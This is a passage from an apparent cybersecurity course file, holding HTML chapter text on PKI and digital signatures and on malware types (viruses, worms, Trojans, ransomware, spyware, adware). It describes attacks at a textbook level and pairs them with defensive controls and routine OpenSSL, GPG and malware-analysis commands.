                <p>Software publishers sign executables and scripts with digital certificates. Operating systems verify signatures before execution. Benefits:</p>
                <ul class="content-list">
                  <li>Proves software authenticity</li>
                  <li>Detects tampering</li>
                  <li>Prevents malware distribution</li>
                  <li>Builds user trust (no "Unknown Publisher" warnings)</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Certificate Trust Models</h3>

                <h4 class="sub-h">Web of Trust (PGP/GPG)</h4>
                <p>Decentralized model where users sign each other's keys. Trust is established through a network of endorsements. Used in PGP email encryption.</p>

                <h4 class="sub-h">Hierarchical Trust (PKI/X.509)</h4>
                <p>Centralized model with Root CAs at the top. Browsers and operating systems ship with a trust store of Root CA certificates. Any certificate signed by a trusted Root (directly or via Intermediate) is trusted.</p>

                <h4 class="sub-h">Certificate Pinning</h4>
                <p>Applications hard-code (pin) the expected certificate or public key. Prevents MITM attacks even if a CA is compromised. Used in mobile apps and high-security environments.</p>

                <h4 class="sub-h">Certificate Transparency (CT)</h4>
                <p>Public logs of all issued certificates. Allows detection of misissued or malicious certificates. Browsers require CT for EV certificates.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">PKI &amp; Certificate Attacks</span>
                    <ul>
                      <li><strong>Rogue CA</strong> — Malicious CA issues fraudulent certificates</li>
                      <li><strong>CA Compromise</strong> — Attacker compromises a trusted CA (e.g., DigiNotar 2011)</li>
                      <li><strong>MITM with Fake Certificate</strong> — Attacker presents a fraudulent certificate</li>
                      <li><strong>Certificate Spoofing</strong> — Domain validation bypass</li>
                      <li><strong>Expired Certificate Exploitation</strong> — Using expired certs</li>
                      <li><strong>Weak Key Generation</strong> — Predictable keys (Debian OpenSSL bug)</li>
                      <li><strong>CRL/OCSP Bypass</strong> — Blocking revocation checks</li>
                      <li><strong>Self-Signed Certificate Abuse</strong> — Tricking users to accept</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Digital Signature Attacks</span>
                    <ul>
                      <li><strong>Signature Forgery</strong> — Forging signatures without private key</li>
                      <li><strong>Hash Collision</strong> — Finding two messages with same hash</li>
                      <li><strong>Key Compromise</strong> — Stealing the signing private key</li>
                      <li><strong>Algorithm Downgrade</strong> — Forcing weak algorithms</li>
                      <li><strong>Replay Attacks</strong> — Reusing valid signatures</li>
                      <li><strong>Length Extension</strong> — Exploiting hash construction</li>
                    </ul>
                  </div>
                </div>

                <h4 class="sub-h">Notable PKI Incidents</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Incident</span><span>Year</span><span>Impact</span></div>
                  <div class="tool-row"><span>DigiNotar Breach</span><span>2011</span><span>Fraudulent Google certificates; CA bankrupt</span></div>
                  <div class="tool-row"><span>Comodo Breach</span><span>2011</span><span>Fake certificates for major domains</span></div>
                  <div class="tool-row"><span>Heartbleed</span><span>2014</span><span>Private key exposure; mass revocation</span></div>
                  <div class="tool-row"><span>Symantec Misissuance</span><span>2015-17</span><span>Distrusted by browsers</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Defensive Controls</h3>

                <h4 class="sub-h">PKI Best Practices</h4>
                <ul class="content-list">
                  <li>Use strong key sizes — RSA 2048+ or ECC P-256+</li>
                  <li>Keep Root CA offline and air-gapped</li>
                  <li>Use Intermediate CAs for daily operations</li>
                  <li>Implement Certificate Transparency monitoring</li>
                  <li>Enable OCSP Stapling for performance and privacy</li>
                  <li>Automate certificate renewal (Let's Encrypt, ACME)</li>
                  <li>Monitor for unauthorized certificates</li>
                  <li>Use HSM for CA private key protection</li>
                  <li>Implement Certificate Pinning where appropriate</li>
                </ul>

                <h4 class="sub-h">Digital Signature Best Practices</h4>
                <ul class="content-list">
                  <li>Use SHA-256 or SHA-3 for hashing</li>
                  <li>Use RSA-PSS, ECDSA, or Ed25519</li>
                  <li>Protect private keys with HSM or smart cards</li>
                  <li>Include timestamps in signatures</li>
                  <li>Validate certificates before verifying signatures</li>
                  <li>Check revocation status (CRL/OCSP)</li>
                  <li>Never reuse signing keys across purposes</li>
                </ul>

                <h4 class="sub-h">Certificate Validation Checklist</h4>
                <ul class="content-list">
                  <li>Certificate chain is complete and valid</li>
                  <li>Certificate is within validity period</li>
                  <li>Domain name matches (CN or SAN)</li>
                  <li>Certificate is not revoked (CRL/OCSP)</li>
                  <li>Signature algorithm is strong</li>
                  <li>Key usage extensions are appropriate</li>
                  <li>Certificate is not self-signed (unless expected)</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Essential Commands</h3>
                <div class="chapter-code-block">
                  <div class="code-block-head"><span>OpenSSL — Certificates &amp; Signatures</span></div>
                  <pre><code># Generate private key and CSR
openssl req -new -newkey rsa:2048 -nodes -keyout private.key -out request.csr

# Generate self-signed certificate
openssl req -x509 -newkey rsa:2048 -nodes -keyout private.key -out cert.pem -days 365

# View certificate details
openssl x509 -in cert.pem -text -noout

# Verify certificate chain
openssl verify -CAfile ca.pem cert.pem

# Sign a file
openssl dgst -sha256 -sign private.key -out signature.bin file.txt

# Verify signature
openssl dgst -sha256 -verify public.key -signature signature.bin file.txt

# Convert formats
openssl x509 -in cert.pem -outform DER -out cert.der
openssl pkcs12 -export -out cert.pfx -inkey private.key -in cert.pem

# Check remote certificate
openssl s_client -connect example.com:443 -showcerts

# Generate Ed25519 key
openssl genpkey -algorithm Ed25519 -out ed25519.key</code></pre>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>GPG — Signing &amp; Verification</span></div>
                  <pre><code># Generate GPG key pair
gpg --full-generate-key

# Sign a file
gpg --detach-sign file.txt

# Verify signature
gpg --verify file.txt.sig file.txt

# Encrypt and sign
gpg --encrypt --sign -r recipient file.txt

# Export public key
gpg --export --armor user@example.com > public.asc</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">9. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>PKI is the framework for managing digital certificates and public keys.</li>
                  <li>Certificate Authorities (CAs) issue and sign digital certificates.</li>
                  <li>X.509 is the standard certificate format.</li>
                  <li>Digital signatures provide authentication, integrity, and non-repudiation.</li>
                  <li>Signatures use private key to sign; public key to verify.</li>
                  <li>Certificate validation includes chain, dates, domain, and revocation checks.</li>
                  <li>Attacks include rogue CAs, MITM, signature forgery, and key compromise.</li>
                  <li>Defenses include strong keys, offline Root CA, CT monitoring, and HSMs.</li>
                  <li>Tools: OpenSSL, GnuPG, certbot, XCA.</li>
                  <li>PKI underpins HTTPS, code signing, email encryption, and VPNs.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">10. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.openssl.org/" target="_blank" rel="noopener">OpenSSL — Certificate and crypto toolkit</a>
                  <a href="https://letsencrypt.org/" target="_blank" rel="noopener">Let's Encrypt — Free automated certificates</a>
                  <a href="https://certificate.transparency.dev/" target="_blank" rel="noopener">Certificate Transparency — Public cert logs</a>
                  <a href="https://gnupg.org/" target="_blank" rel="noopener">GnuPG — PGP encryption and signing</a>
                  <a href="https://www.ssllabs.com/ssltest/" target="_blank" rel="noopener">SSL Labs — TLS/SSL analysis</a>
                  <a href="https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final" target="_blank" rel="noopener">NIST SP 800-57 — Key management</a>
                  <a href="https://www.rfc-editor.org/rfc/rfc5280" target="_blank" rel="noopener">RFC 5280 — X.509 Certificate Standard</a>
                </div>
              </section>
            ` },
        ],
      },

      // ============================================================
      // MODULE 3 — MALWARE
      // ============================================================
      {
        id: "m3",
        type: "part",
        number: 3,
        title: "Malware & Threat Types",
        icon: "☣️",
        blurb: "Malware is the tool of the trade for the modern attacker. This module catalogs each major family — how they spread, what they do, and how defenders spot them.",
        chapters: [
                    { id: "3.1", title: "Virus, Worm & Trojan", pages: "257-270", read: 20,
            build: "Analyze three malware samples and classify their behavior.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>A Virus</strong> is malicious software that attaches to a legitimate program or file. It requires user action (running an infected program) to execute and spread. Viruses can replicate, corrupt files, steal data, or damage systems.</p>
                <p><strong>A Worm</strong> is a standalone malicious program that self-replicates and spreads across networks without user interaction. Worms exploit vulnerabilities in network services, operating systems, or applications.</p>
                <p><strong>A Trojan Horse</strong> is malicious software disguised as legitimate software. Unlike viruses and worms, Trojans do not self-replicate. They rely on social engineering to trick users into installing them. Once installed, they can create backdoors, steal data, spy, or download additional malware.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Examples</h3>
                <ul class="content-list">
                  <li><strong>Virus:</strong> A user downloads a pirated game. The installer contains a virus. When run, it infects the system, corrupts files, and spreads to other executables.</li>
                  <li><strong>Worm:</strong> WannaCry (2017) exploited EternalBlue in Windows SMB (port 445). It spread automatically, infecting over 200,000 systems in 150 countries within days. No user interaction required.</li>
                  <li><strong>Trojan:</strong> An email claims to be from a bank with attachment "Statement.pdf.exe". The user opens it, thinking it is a PDF. The Trojan installs a backdoor, allowing remote control.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Virus In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/virus-worm-trojan.png" alt="Comparison of virus, worm, and Trojan propagation methods" />
                  <figcaption>Figure 3.1 — Virus requires host and user action; worm self-replicates over networks; Trojan disguises as legitimate software.</figcaption>
                </figure>

                <h4 class="sub-h">Characteristics</h4>
                <ul class="content-list">
                  <li>Requires a host file or program.</li>
                  <li>Needs user action to execute.</li>
                  <li>Can replicate and spread to other files.</li>
                  <li>May have a trigger (date, event) for payload.</li>
                  <li>Can be polymorphic (changes code to evade detection).</li>
                </ul>

                <h4 class="sub-h">Types of Viruses</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Type</span><span>Description</span></div>
                  <div class="tool-row"><span>File Infector</span><span>Attaches to executable files (.exe, .com)</span></div>
                  <div class="tool-row"><span>Macro Virus</span><span>Infects documents (Word, Excel macros)</span></div>
                  <div class="tool-row"><span>Boot Sector Virus</span><span>Infects the master boot record (MBR)</span></div>
                  <div class="tool-row"><span>Multipartite Virus</span><span>Infects both files and boot sector</span></div>
                  <div class="tool-row"><span>Polymorphic Virus</span><span>Changes its code each infection</span></div>
                  <div class="tool-row"><span>Metamorphic Virus</span><span>Rewrites itself completely each infection</span></div>
                  <div class="tool-row"><span>Stealth Virus</span><span>Hides itself from antivirus</span></div>
                  <div class="tool-row"><span>Resident Virus</span><span>Stays in memory after execution</span></div>
                  <div class="tool-row"><span>Non-Resident Virus</span><span>Executes and exits immediately</span></div>
                </div>

                <h4 class="sub-h">How Viruses Spread</h4>
                <ul class="content-list">
                  <li>Infected email attachments</li>
                  <li>Pirated software</li>
                  <li>Infected USB drives</li>
                  <li>Malicious websites (drive-by downloads)</li>
                  <li>Network shares</li>
                  <li>Infected documents (macro viruses)</li>
                </ul>

                <h4 class="sub-h">Payload Types</h4>
                <ul class="content-list">
                  <li>File deletion or corruption</li>
                  <li>Data theft</li>
                  <li>System slowdown</li>
                  <li>Displaying messages or images</li>
                  <li>Disabling security software</li>
                  <li>Encrypting files (ransomware)</li>
                  <li>Creating backdoors</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Worm In Depth</h3>

                <h4 class="sub-h">Characteristics</h4>
                <ul class="content-list">
                  <li>Standalone program (no host file needed).</li>
                  <li>Self-replicating and self-propagating.</li>
                  <li>Spreads over networks automatically.</li>
                  <li>Exploits vulnerabilities in services or OS.</li>
                  <li>Can consume bandwidth and system resources.</li>
                  <li>Often carries a payload (ransomware, backdoor, botnet agent).</li>
                </ul>

                <h4 class="sub-h">How Worms Spread</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Method</span><span>Description</span></div>
                  <div class="tool-row"><span>Network Vulnerabilities</span><span>Exploiting unpatched services (SMB, RDP)</span></div>
                  <div class="tool-row"><span>Email</span><span>Sending copies to all contacts</span></div>
                  <div class="tool-row"><span>File Sharing</span><span>Copying itself to shared folders</span></div>
                  <div class="tool-row"><span>Removable Media</span><span>Infecting USB drives</span></div>
                  <div class="tool-row"><span>Social Engineering</span><span>Tricking users into clicking links</span></div>
                  <div class="tool-row"><span>Instant Messaging</span><span>Sending links to contacts</span></div>
                </div>

                <h4 class="sub-h">Notable Worms</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Worm</span><span>Year</span><span>Impact</span></div>
                  <div class="tool-row"><span>Morris Worm</span><span>1988</span><span>First major Internet worm; crashed 10% of Internet</span></div>
                  <div class="tool-row"><span>Code Red</span><span>2001</span><span>Defaced websites; DDoS</span></div>
                  <div class="tool-row"><span>SQL Slammer</span><span>2003</span><span>Disabled Internet in South Korea; 75,000 infections in 10 minutes</span></div>
                  <div class="tool-row"><span>Conficker</span><span>2008</span><span>Infected 9–15 million systems; created botnet</span></div>
                  <div class="tool-row"><span>Stuxnet</span><span>2010</span><span>Targeted Iranian nuclear centrifuges</span></div>
                  <div class="tool-row"><span>WannaCry</span><span>2017</span><span>Ransomware worm; 200,000+ systems</span></div>
                  <div class="tool-row"><span>NotPetya</span><span>2017</span><span>Destructive worm; $10 billion damage</span></div>
                </div>

                <h4 class="sub-h">Worm Payloads</h4>
                <ul class="content-list">
                  <li>Ransomware (WannaCry)</li>
                  <li>Botnet recruitment (Conficker)</li>
                  <li>Data destruction (NotPetya)</li>
                  <li>Espionage (Stuxnet)</li>
                  <li>Backdoor installation</li>
                  <li>DDoS attacks</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Trojan Horse In Depth</h3>

                <h4 class="sub-h">Characteristics</h4>
                <ul class="content-list">
                  <li>Disguised as legitimate software.</li>
                  <li>Does not self-replicate.</li>
                  <li>Relies on user installation.</li>
                  <li>Can create backdoors, steal data, spy, or download other malware.</li>
                  <li>Often delivered via phishing, malicious downloads, or social engineering.</li>
                </ul>

                <h4 class="sub-h">Types of Trojans</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Type</span><span>Description</span></div>
                  <div class="tool-row"><span>Backdoor Trojan</span><span>Creates remote access for attacker</span></div>
                  <div class="tool-row"><span>Downloader Trojan</span><span>Downloads and installs additional malware</span></div>
                  <div class="tool-row"><span>Banking Trojan</span><span>Steals banking credentials</span></div>
                  <div class="tool-row"><span>DDoS Trojan</span><span>Turns system into botnet node</span></div>
                  <div class="tool-row"><span>Fake AV Trojan</span><span>Pretends to be antivirus; demands payment</span></div>
                  <div class="tool-row"><span>Game-thief Trojan</span><span>Steals game account credentials</span></div>
                  <div class="tool-row"><span>Ransom Trojan</span><span>Encrypts files and demands ransom</span></div>
                  <div class="tool-row"><span>Rootkit Trojan</span><span>Hides deep in system; provides persistent access</span></div>
                  <div class="tool-row"><span>SMS Trojan</span><span>Sends premium SMS messages</span></div>
                  <div class="tool-row"><span>Spyware Trojan</span><span>Monitors user activity and steals data</span></div>
                </div>

                <h4 class="sub-h">Delivery Methods</h4>
                <ul class="content-list">
                  <li>Phishing emails with malicious attachments</li>
                  <li>Fake software downloads (cracked software, keygens)</li>
                  <li>Malicious websites (drive-by downloads)</li>
                  <li>Social media links</li>
                  <li>Fake updates (Flash, Java)</li>
                  <li>USB drives</li>
                  <li>Instant messages</li>
                </ul>

                <h4 class="sub-h">Notable Trojans</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Trojan</span><span>Impact</span></div>
                  <div class="tool-row"><span>Zeus</span><span>Banking credential theft; botnet</span></div>
                  <div class="tool-row"><span>Emotet</span><span>Banking Trojan; later became malware delivery service</span></div>
                  <div class="tool-row"><span>TrickBot</span><span>Banking Trojan; ransomware delivery</span></div>
                  <div class="tool-row"><span>RAT (Remote Access Trojan)</span><span>Full remote control of victim system</span></div>
                  <div class="tool-row"><span>DarkComet</span><span>RAT used in targeted attacks</span></div>
                  <div class="tool-row"><span>njRAT</span><span>Popular RAT in Middle East</span></div>
                  <div class="tool-row"><span>Gh0st RAT</span><span>Used in espionage campaigns</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Virus Attacks</span>
                    <ul>
                      <li><strong>Infection:</strong> Attaching to executables or documents.</li>
                      <li><strong>Evasion:</strong> Polymorphic/metamorphic code to avoid antivirus.</li>
                      <li><strong>Propagation:</strong> USB drives, email, network shares.</li>
                      <li><strong>Payload:</strong> Data theft, file corruption, ransomware.</li>
                      <li><strong>Trigger:</strong> Time-based, event-based, or user action.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Worm Attacks</span>
                    <ul>
                      <li><strong>Scanning:</strong> Finding vulnerable hosts on the network.</li>
                      <li><strong>Exploitation:</strong> Using exploits like EternalBlue.</li>
                      <li><strong>Propagation:</strong> Copying itself to new hosts.</li>
                      <li><strong>Payload:</strong> Ransomware, botnet, backdoor.</li>
                      <li><strong>Impact:</strong> Rapid, widespread infection.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Trojan Attacks</span>
                    <ul>
                      <li><strong>Social Engineering:</strong> Tricking users into installing.</li>
                      <li><strong>Backdoor:</strong> Creating persistent remote access.</li>
                      <li><strong>Data Theft:</strong> Stealing credentials, files, keystrokes.</li>
                      <li><strong>Espionage:</strong> Monitoring user activity.</li>
                      <li><strong>Botnet:</strong> Adding system to botnet.</li>
                      <li><strong>Lateral Movement:</strong> Using compromised system to attack others.</li>
                    </ul>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Defensive Controls</h3>

                <h4 class="sub-h">Against Viruses</h4>
                <ul class="content-list">
                  <li>Use antivirus software with real-time protection.</li>
                  <li>Keep signatures updated.</li>
                  <li>Avoid pirated software and unknown downloads.</li>
                  <li>Disable macros in Office documents by default.</li>
                  <li>Scan USB drives before opening.</li>
                  <li>Use email filtering.</li>
                  <li>Regular backups.</li>
                  <li>User education.</li>
                </ul>

                <h4 class="sub-h">Against Worms</h4>
                <ul class="content-list">
                  <li>Patch operating systems and applications promptly.</li>
                  <li>Disable unnecessary services (e.g., SMBv1).</li>
                  <li>Use firewalls to block unnecessary ports.</li>
                  <li>Segment networks.</li>
                  <li>Use intrusion detection/prevention systems.</li>
                  <li>Monitor network traffic for unusual patterns.</li>
                  <li>Apply least privilege.</li>
                  <li>Regular vulnerability scanning.</li>
                </ul>

                <h4 class="sub-h">Against Trojans</h4>
                <ul class="content-list">
                  <li>Never open suspicious attachments or links.</li>
                  <li>Download software only from official sources.</li>
                  <li>Use antivirus and anti-malware.</li>
                  <li>Enable firewall.</li>
                  <li>Use application whitelisting.</li>
                  <li>Monitor outbound connections.</li>
                  <li>Use sandboxing for unknown files.</li>
                  <li>Educate users on social engineering.</li>
                  <li>Use MFA to protect accounts.</li>
                </ul>

                <h4 class="sub-h">General Best Practices</h4>
                <ul class="content-list">
                  <li>Defense in depth: multiple layers of security.</li>
                  <li>Regular backups (offline, offsite).</li>
                  <li>Incident response plan.</li>
                  <li>Endpoint Detection and Response (EDR).</li>
                  <li>Security awareness training.</li>
                  <li>Least privilege.</li>
                  <li>Network segmentation.</li>
                  <li>Continuous monitoring.</li>
                  <li>Threat intelligence.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>VirusTotal</span><span>Scan files and URLs</span></div>
                  <div class="tool-row"><span>Any.Run</span><span>Interactive malware sandbox</span></div>
                  <div class="tool-row"><span>Hybrid Analysis</span><span>Malware analysis</span></div>
                  <div class="tool-row"><span>Joe Sandbox</span><span>Malware sandbox</span></div>
                  <div class="tool-row"><span>Cuckoo Sandbox</span><span>Open-source sandbox</span></div>
                  <div class="tool-row"><span>Wireshark</span><span>Network traffic analysis</span></div>
                  <div class="tool-row"><span>Process Monitor</span><span>Windows process monitoring</span></div>
                  <div class="tool-row"><span>Autoruns</span><span>Startup program viewer</span></div>
                  <div class="tool-row"><span>Malwarebytes</span><span>Anti-malware</span></div>
                  <div class="tool-row"><span>ClamAV</span><span>Open-source antivirus</span></div>
                  <div class="tool-row"><span>YARA</span><span>Pattern matching for malware</span></div>
                  <div class="tool-row"><span>Snort</span><span>IDS/IPS</span></div>
                  <div class="tool-row"><span>Suricata</span><span>IDS/IPS</span></div>
                  <div class="tool-row"><span>Nmap</span><span>Network scanning</span></div>
                  <div class="tool-row"><span>Metasploit</span><span>Exploitation framework</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Common Malware Analysis Commands</span></div>
                  <pre><code># Scan home directory with ClamAV
clamscan -r /home

# Scan file with YARA
yara rules.yar file.exe

# Memory forensics
volatility -f memory.dmp imageinfo

# Extract strings from binary
strings malware.exe

# Compute hashes
md5sum malware.exe
sha256sum malware.exe</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">9. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Virus: requires host and user action; can corrupt files.</li>
                  <li>Worm: self-replicating; spreads over networks automatically.</li>
                  <li>Trojan: disguised as legitimate software; creates backdoors.</li>
                  <li>Viruses spread via files, email, USB.</li>
                  <li>Worms spread via network vulnerabilities.</li>
                  <li>Trojans spread via social engineering.</li>
                  <li>Notable: Morris, Code Red, SQL Slammer, Conficker, Stuxnet, WannaCry, NotPetya.</li>
                  <li>Notable Trojans: Zeus, Emotet, TrickBot, RATs.</li>
                  <li>Defenses: patching, antivirus, firewalls, user education, segmentation, monitoring.</li>
                  <li>Tools: VirusTotal, Any.Run, Wireshark, YARA, ClamAV.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">10. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.virustotal.com/" target="_blank" rel="noopener">VirusTotal — File and URL scanner</a>
                  <a href="https://any.run/" target="_blank" rel="noopener">Any.Run — Interactive sandbox</a>
                  <a href="https://virustotal.github.io/yara/" target="_blank" rel="noopener">YARA — Pattern matching</a>
                  <a href="https://www.clamav.net/" target="_blank" rel="noopener">ClamAV — Open-source antivirus</a>
                </div>
              </section>
            ` },
                    { id: "3.2", title: "Ransomware, Spyware & Adware", pages: "271-286", read: 20,
            build: "Simulate a ransomware attack and implement backup recovery.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>Ransomware</strong> encrypts a victim's files or locks their system, rendering it unusable until a ransom is paid. Modern ransomware often steals data before encryption and threatens to publish it if the ransom is not paid (double extortion).</p>
                <p><strong>Spyware</strong> secretly monitors user activity, collects sensitive information (keystrokes, browsing habits, credentials, screenshots), and transmits it to a remote attacker without consent.</p>
                <p><strong>Adware</strong> automatically displays or downloads advertisements. While not always malicious, adware often bundles with spyware, tracks user behavior, redirects browsers, and degrades performance.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Examples</h3>
                <ul class="content-list">
                  <li><strong>Ransomware:</strong> Colonial Pipeline (2021) forced shutdown of a major U.S. fuel pipeline. The company paid $4.4 million. DarkSide group used compromised credentials.</li>
                  <li><strong>Spyware:</strong> Pegasus (NSO Group) infected smartphones via zero-click exploits. It read messages, tracked location, accessed camera/mic, and exfiltrated data. Targeted journalists, activists, politicians.</li>
                  <li><strong>Adware:</strong> A free video player from an untrusted site bundles adware. It injects ads, changes browser homepage, redirects searches, and tracks browsing behavior.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Ransomware In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/ransomware-spyware-adware.png" alt="Ransomware encryption flow, spyware data collection, and adware injection" />
                  <figcaption>Figure 3.2 — Ransomware encrypts and demands payment; spyware secretly collects data; adware injects unwanted ads and tracks behavior.</figcaption>
                </figure>

                <h4 class="sub-h">How Ransomware Works</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Infection: Delivered via phishing, malicious downloads, exploit kits, RDP brute force, or supply chain.</div>
                  <div class="step-item"><span class="step-num">2</span> Execution: Malware runs and establishes persistence.</div>
                  <div class="step-item"><span class="step-num">3</span> Reconnaissance: Identifies valuable files, backups, network shares.</div>
                  <div class="step-item"><span class="step-num">4</span> Lateral Movement: Spreads using stolen credentials or exploits.</div>
                  <div class="step-item"><span class="step-num">5</span> Data Exfiltration: Steals sensitive data before encryption (double extortion).</div>
                  <div class="step-item"><span class="step-num">6</span> Encryption: Encrypts files using AES + RSA.</div>
                  <div class="step-item"><span class="step-num">7</span> Ransom Note: Displays payment instructions (cryptocurrency).</div>
                  <div class="step-item"><span class="step-num">8</span> Deadline: Threatens to delete key or publish data.</div>
                </div>

                <h4 class="sub-h">Types of Ransomware</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Type</span><span>Description</span></div>
                  <div class="tool-row"><span>Crypto Ransomware</span><span>Encrypts files; most common</span></div>
                  <div class="tool-row"><span>Locker Ransomware</span><span>Locks the entire system/OS</span></div>
                  <div class="tool-row"><span>Scareware</span><span>Fake warnings; demands payment for fake fix</span></div>
                  <div class="tool-row"><span>Doxware/Leakware</span><span>Steals data; threatens to publish</span></div>
                  <div class="tool-row"><span>RaaS (Ransomware-as-a-Service)</span><span>Ransomware sold/rented to affiliates</span></div>
                  <div class="tool-row"><span>Double Extortion</span><span>Encrypts and steals data</span></div>
                  <div class="tool-row"><span>Triple Extortion</span><span>Adds DDoS or customer pressure</span></div>
                </div>

                <h4 class="sub-h">Notable Ransomware Groups</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Group</span><span>Notable Attacks</span></div>
                  <div class="tool-row"><span>REvil</span><span>JBS Foods, Kaseya</span></div>
                  <div class="tool-row"><span>DarkSide</span><span>Colonial Pipeline</span></div>
                  <div class="tool-row"><span>Conti</span><span>Ireland Health Service</span></div>
                  <div class="tool-row"><span>LockBit</span><span>Multiple global targets</span></div>
                  <div class="tool-row"><span>Cl0p</span><span>MOVEit supply chain</span></div>
                  <div class="tool-row"><span>BlackCat/ALPHV</span><span>Healthcare, casinos</span></div>
                  <div class="tool-row"><span>Hive</span><span>Healthcare, schools</span></div>
                </div>

                <h4 class="sub-h">Ransomware Payment</h4>
                <ul class="content-list">
                  <li>Usually demanded in Bitcoin or Monero.</li>
                  <li>Average ransom: $100,000–$2 million+.</li>
                  <li>Payment does not guarantee decryption.</li>
                  <li>Paying encourages more attacks.</li>
                  <li>Law enforcement discourages payment.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Spyware In Depth</h3>

                <h4 class="sub-h">How Spyware Works</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Installation: Bundled with software, phishing, drive-by download, or exploit.</div>
                  <div class="step-item"><span class="step-num">2</span> Persistence: Hides in system, often using rootkit techniques.</div>
                  <div class="step-item"><span class="step-num">3</span> Collection: Records keystrokes, screenshots, browsing, credentials, files.</div>
                  <div class="step-item"><span class="step-num">4</span> Exfiltration: Sends data to attacker's command and control (C2) server.</div>
                  <div class="step-item"><span class="step-num">5</span> Updates: Can update itself to evade detection.</div>
                </div>

                <h4 class="sub-h">Types of Spyware</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Type</span><span>Description</span></div>
                  <div class="tool-row"><span>Keylogger</span><span>Records keystrokes</span></div>
                  <div class="tool-row"><span>Screen Scraper</span><span>Takes screenshots</span></div>
                  <div class="tool-row"><span>Browser Hijacker</span><span>Modifies browser settings</span></div>
                  <div class="tool-row"><span>Tracking Cookie</span><span>Tracks browsing behavior</span></div>
                  <div class="tool-row"><span>System Monitor</span><span>Monitors system activity</span></div>
                  <div class="tool-row"><span>Password Stealer</span><span>Extracts saved credentials</span></div>
                  <div class="tool-row"><span>Infostealer</span><span>Steals files, credentials, crypto wallets</span></div>
                  <div class="tool-row"><span>Stalkerware</span><span>Monitors partner/family without consent</span></div>
                  <div class="tool-row"><span>Legal Spyware</span><span>Used by governments (Pegasus)</span></div>
                </div>

                <h4 class="sub-h">Notable Spyware</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Spyware</span><span>Impact</span></div>
                  <div class="tool-row"><span>Pegasus</span><span>Targeted journalists, activists</span></div>
                  <div class="tool-row"><span>FinFisher</span><span>Government surveillance</span></div>
                  <div class="tool-row"><span>DarkHotel</span><span>Targeted business travelers</span></div>
                  <div class="tool-row"><span>Agent Tesla</span><span>Credential theft via email</span></div>
                  <div class="tool-row"><span>RedLine</span><span>Steals passwords, crypto wallets</span></div>
                  <div class="tool-row"><span>Raccoon</span><span>Infostealer sold as a service</span></div>
                </div>

                <h4 class="sub-h">Spyware vs Legal Monitoring</h4>
                <ul class="content-list">
                  <li><strong>Spyware:</strong> Installed without consent; malicious intent.</li>
                  <li><strong>Legal Monitoring:</strong> Employer monitoring with consent; parental controls.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Adware In Depth</h3>

                <h4 class="sub-h">How Adware Works</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Installation: Bundled with free software, fake downloads, or malicious ads.</div>
                  <div class="step-item"><span class="step-num">2</span> Integration: Integrates with browser or system.</div>
                  <div class="step-item"><span class="step-num">3</span> Ad Injection: Displays pop-ups, banners, redirects.</div>
                  <div class="step-item"><span class="step-num">4</span> Tracking: Collects browsing data for targeted ads.</div>
                  <div class="step-item"><span class="step-num">5</span> Monetization: Generates revenue for adware authors.</div>
                </div>

                <h4 class="sub-h">Types of Adware</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Type</span><span>Description</span></div>
